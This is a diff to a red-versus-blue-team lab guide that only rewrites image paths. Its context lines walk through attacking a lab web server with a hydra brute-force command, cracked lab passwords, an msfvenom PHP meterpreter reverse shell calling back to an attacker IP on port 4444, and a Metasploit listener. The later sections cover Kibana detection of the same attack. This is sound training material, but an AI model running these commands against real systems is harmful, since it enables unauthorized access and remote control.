@@ -37,7 +37,7 @@ From the Nmap scan we can see that port `80` is open. Open a web browser and typ
 
 - The directory asks for authentication in order to access it. Reading the authentication method, it says "For ashton's eyes only."
 
-    ![Password-protected directory prompt for Ashton's folder](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/4_password_protect.png)
+    ![Password-protected directory prompt for Ashton's folder](Step-By-Step-Guide/Part%201/Images/4_password_protect.png)
 
 ## 🔨 Step 3 — Brute-Force the Directory Password
 
@@ -47,21 +47,21 @@ Because the folder is password protected, we need to either guess the password o
 
   - Type: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
 
-      ![Hydra command syntax against the secret_folder path](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/5_hydra_sytanx.png)
+      ![Hydra command syntax against the secret_folder path](Step-By-Step-Guide/Part%201/Images/5_hydra_sytanx.png)
 
 - The brute force attack may take some time. Once it finishes, you'll find the username is `ashton` and the password is `leopoldo`.
 
-    ![Hydra revealing the password 'leopoldo' for user 'ashton'](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/6_password_discovery.png)
+    ![Hydra revealing the password 'leopoldo' for user 'ashton'](Step-By-Step-Guide/Part%201/Images/6_password_discovery.png)
 
 - Go back to the web browser and use the credentials to log in. Click the file `connecting_to_webdav`.
 
-   ![Contents of the secret_folder after successful login](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/7_inside_secret_directory.png)
+   ![Contents of the secret_folder after successful login](Step-By-Step-Guide/Part%201/Images/7_inside_secret_directory.png)
 
 - Located inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.
 
-   ![WebDAV connection instructions from the discovered file](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/8_webdav_instructions.png)
+   ![WebDAV connection instructions from the discovered file](Step-By-Step-Guide/Part%201/Images/8_webdav_instructions.png)
 
-   ![WebDAV credentials with hashed password](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/8a_webdav_hash.png)
+   ![WebDAV credentials with hashed password](Step-By-Step-Guide/Part%201/Images/8a_webdav_hash.png)
 
 ## 🔓 Step 4 — Crack the Password Hash
 
@@ -69,7 +69,7 @@ There are several ways to break the password hash. Here, we simply used Crack St
 
 Navigate to `https://crackstation.net`; paste the password hash and fill out the CAPTCHA; and click **Crack Hashes**.
 
-   ![Password hash cracked via CrackStation revealing 'linux4u'](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/9_password_hash.png)
+   ![Password hash cracked via CrackStation revealing 'linux4u'](Step-By-Step-Guide/Part%201/Images/9_password_hash.png)
 
   - The password is revealed as: `linux4u`
 
@@ -84,7 +84,7 @@ In addition, the instructions show an outdated IP address that the students will
   - Click `Browse Network`.
   - In the URL bar, type: `dav://192.168.1.105/webdav`, and enter the credentials to log in.
 
-    ![Connecting to the WebDAV share via the file manager](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/10_connect_to_webdav.png)
+    ![Connecting to the WebDAV share via the file manager](Step-By-Step-Guide/Part%201/Images/10_connect_to_webdav.png)
 
 ## 🐚 Step 6 — Upload a PHP Reverse Shell Payload
 
@@ -92,7 +92,7 @@ In addition, the instructions show an outdated IP address that the students will
 
   - `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`
 
-   ![msfvenom generating the PHP reverse shell payload](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/11_msfvenom.png)
+   ![msfvenom generating the PHP reverse shell payload](Step-By-Step-Guide/Part%201/Images/11_msfvenom.png)
 
 - Run this series of commands to set up a listener:
 
@@ -103,20 +103,20 @@ In addition, the instructions show an outdated IP address that the students will
   - `set LHOST 192.168.1.90`
   - `exploit`
 
-    ![Metasploit multi-handler listener started on port 4444](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/12_listener.png)
+    ![Metasploit multi-handler listener started on port 4444](Step-By-Step-Guide/Part%201/Images/12_listener.png)
 
 - Place the reverse shell onto the WebDAV directory.
 
-    ![PHP reverse shell placed into the WebDAV directory](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/13_implanting_the_reverse.png)
+    ![PHP reverse shell placed into the WebDAV directory](Step-By-Step-Guide/Part%201/Images/13_implanting_the_reverse.png)
 
 - Now that you're logged in, connect to the WebDAV folder by navigating to `192.168.1.105/webdav`. Use the credentials that you used before, `user:ryan pass:linux4u`.
 
-  ![Logged into the WebDAV directory in the browser](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/14_webdav.png)
+  ![Logged into the WebDAV directory in the browser](Step-By-Step-Guide/Part%201/Images/14_webdav.png)
 
 - Navigate to where you first uploaded the reverse shell and click it to activate it. If it seems like the browser is hanging or loading, that means it has worked.
     - If it asks you if you'd like to save or open the PDF file, start again at the beginning of Step 5.
 
-  ![Reverse shell activated — browser hanging while listener catches the callback](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/15_activiating_the_shell.png)
+  ![Reverse shell activated — browser hanging while listener catches the callback](Step-By-Step-Guide/Part%201/Images/15_activiating_the_shell.png)
 
 ## 🏁 Step 7 — Find and Capture the Flag
 
@@ -128,7 +128,7 @@ In addition, the instructions show an outdated IP address that the students will
 
 Students can read the file, once located, with `cat`.
 
-   ![Contents of flag.txt viewed via the meterpreter shell](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%201/Images/16_view_files.png)
+   ![Contents of flag.txt viewed via the meterpreter shell](Step-By-Step-Guide/Part%201/Images/16_view_files.png)
 
 | :warning: **Important Checkpoint** :warning:                     |
 |------------------------------------------------------------------|
@@ -173,7 +173,7 @@ Click on **Create dashboard** in the upper left hand side. On the new page click
 
 Your final dashboard should look similar to:
 
-![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Dashboard.png)
+![](Step-By-Step-Guide/Part%202/Images/Dashboard.png)
 
 Next, get familiar with running search queries in the `Discover` screen with Packetbeat.
 - On the Discover page, locate the search field.
@@ -193,7 +193,7 @@ Some helpful searches include
 - `destination.port: 4444`
 - `NOT source.port: 80 and NOT source.port: 443`
 
-![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Searching.png)
+![](Step-By-Step-Guide/Part%202/Images/Searching.png)
 
 After you create your dashboard and become familiar with the search syntax, use these tools to answer the questions below:
 
@@ -212,7 +212,7 @@ When did the interaction occur?
 
 - You know when the interaction happened so we will need to change the timeline that Kibana is searching to see that time period:
 
-![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/show-dates.png)
+![](Step-By-Step-Guide/Part%202/Images/show-dates.png)
 
 In your dashboard, look through the different panels and use this data to look through the results and notice the following interactions:
 
@@ -220,23 +220,23 @@ What responses did the victim send back?
 
 - On our dashboard, we can see the top responses in the `HTTP status codes for the top queries [Packetbeat] ECS`
 
-	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Status-codes.png)
+	![](Step-By-Step-Guide/Part%202/Images/Status-codes.png)
 
 - We can see `401`, `301`, `207`, `404` and `200` as the top responses.
 
 - We can also see with the `HTTP Error Codes [Packetbeat] ECS` panel:
 
-	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Error-code.png)
+	![](Step-By-Step-Guide/Part%202/Images/Error-code.png)
 
 What data is concerning from the Blue Team perspective?
 
 - We can see a connection spike in the `Connections over time [Packetbeat Flows] ECS`
 
-  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Connection-spike.png)
+  ![](Step-By-Step-Guide/Part%202/Images/Connection-spike.png)
 
 - We can also see a spike in errors in the `Errors vs successful transactions [Packetbeat] ECS`
 
-  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Error-spike.png)
+  ![](Step-By-Step-Guide/Part%202/Images/Error-spike.png)
 
 ### 🕵️ 2. Find the Request for the Hidden Directory
 
@@ -246,7 +246,7 @@ How many requests were made to this directory? At what time and from which IP ad
 
 - On the dashboard you built, a look at your `Top 10 HTTP requests [Packetbeat] ECS` panel:
 
-   ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Top-folders.png)
+   ![](Step-By-Step-Guide/Part%202/Images/Top-folders.png)
 
 - In this example we can see that this folder was requested `6,197` times.
 
@@ -275,7 +275,7 @@ Can you identify packets specifically from Hydra?
 
 Look through the results and notice that `Hydra` is identified under the `user_agent.original` section:
 
-  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Hydra-Evidence.png)
+  ![](Step-By-Step-Guide/Part%202/Images/Hydra-Evidence.png)
 
 How many requests were made in the brute-force attack? How many requests had the attacker made before discovering the correct password in this one? 
 
@@ -283,11 +283,11 @@ How many requests were made in the brute-force attack? How many requests had the
 
    **Note:** Your results will differ.
 
-   ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/secret-folder.png)
+   ![](Step-By-Step-Guide/Part%202/Images/secret-folder.png)
 
 Take a look at the `HTTP status codes for the top queries [Packetbeat] ECS` panel:
 
-![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/HTTP-Errors.png)
+![](Step-By-Step-Guide/Part%202/Images/HTTP-Errors.png)
 
 - You can see on this panel the breakdown of `401 Unauthorized` status codes as opposed to `200 OK` status codes.
 
@@ -295,11 +295,11 @@ Take a look at the `HTTP status codes for the top queries [Packetbeat] ECS` pane
 
 - We can see a connection spike in the `Connections over time [Packetbeat Flows] ECS`
 
-	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Connection-spike.png)
+	![](Step-By-Step-Guide/Part%202/Images/Connection-spike.png)
 
 - We can also see a spike in errors in the `Errors vs successful transactions [Packetbeat] ECS`
 
-	![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/Error-spike.png)
+	![](Step-By-Step-Guide/Part%202/Images/Error-spike.png)
 
 These are all results generated by the brute force attack with Hydra.
 
@@ -321,11 +321,11 @@ How many requests were made to this directory?
 
 - We can again see in the `Top 10 HTTP requests [Packetbeat] ECS` panel that the WebDAV folder was directly connected and files inside were accessed.
 
-  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/webdav.png)
+  ![](Step-By-Step-Guide/Part%202/Images/webdav.png)
 
 - We can also see it in the pie charts:
 
-  ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/WebDav-pie.png)
+  ![](Step-By-Step-Guide/Part%202/Images/WebDav-pie.png)
 
 Which file(s) were requested?
 
@@ -348,7 +348,7 @@ Can you identify traffic from the meterpreter session?
 
 -  First, we can see the `shell.php` file in the `webdav` directory on the `Top 10 HTTP requests [Packetbeat] ECS` panel.
 
-   ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%202/Images/webdav.png)
+   ![](Step-By-Step-Guide/Part%202/Images/webdav.png)
 
 - Remember that your meterpreter session ran over port `4444`. Port `4444` is the _default_ port used for meterpreter and the port used in all of their documentation. Because of this, many attackers forget to change this port when conducting an attack. You can construct a search query to find these packets.
 
@@ -408,31 +408,31 @@ To complete the next part of the project, you should take screen shots that repr
 
   - **Unusual Request Volume**: Logs indicate an unusual number of requests and failed responses between the Kali VM and the target. Note that `401`, `301`, `207`, `404` and `200` are the top responses.
 
-    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Status-codes.png)
+    ![](Step-By-Step-Guide/Part%203/Images/Status-codes.png)
 
     - In addition, note the connection spike in the `Connections over time [Packetbeat Flows] ECS`, as well as the spike in errors in the `Errors vs successful transactions [Packetbeat] ECS`
 
-    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Connection-spike.png)
+    ![](Step-By-Step-Guide/Part%203/Images/Connection-spike.png)
 
-    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Error-spike.png)
+    ![](Step-By-Step-Guide/Part%203/Images/Error-spike.png)
 
   - **Access to Sensitive Data in `secret_folder`**: On the dashboard you built, a look at your `Top 10 HTTP requests [Packetbeat] ECS` panel. In this example, this folder was requested `6,197` times. The file `connect_to_corp_server` was requested `3` times.
 
-    ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Top-folders.png)
+    ![](Step-By-Step-Guide/Part%203/Images/Top-folders.png)
 
   - **HTTP Brute Force Attack**: Searching for `url.path: /company_folders/secret_folder/` shows conversations involving the sensitive data. Specifically, the results contain requests from the brute-forcing tool`Hydra`, identified under the `user_agent.original` section:
 
-      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/Hydra-Evidence.png)
+      ![](Step-By-Step-Guide/Part%203/Images/Hydra-Evidence.png)
 
     - In addition, the logs contain evidence of a large number of requests for the sensitive data, of which only `3` were successful. This is a telltale signature of a brute-force attack. Specifically, the password protected `secret_folder` was requested `6209` times. However, the file inside that directory was only requested `3` times. So, out of `6209` requests, only `3` were successful. 
 
-      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/secret-folder.png) 
+      ![](Step-By-Step-Guide/Part%203/Images/secret-folder.png) 
 
   - **WebDAV Connection & Upload of `shell.php`**: The logs also indicate that an unauthorized actor was able to access protected data in the `webdav` directory. The `passwd.dav` file was requested via `GET`, and `shell.php` uploaded via `POST`.
 
-      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/webdav.png)
+      ![](Step-By-Step-Guide/Part%203/Images/webdav.png)
 
-      ![](Red%20Vs%20Blue%20Team%20Project/Step-By-Step-Guide/Part%203/Images/WebDav-pie.png)
+      ![](Step-By-Step-Guide/Part%203/Images/WebDav-pie.png)
 
 - **Mitigation**: What alarms should you set to detect this behavior next time? What controls should you put in place on the target to prevent the attack from happening?
 
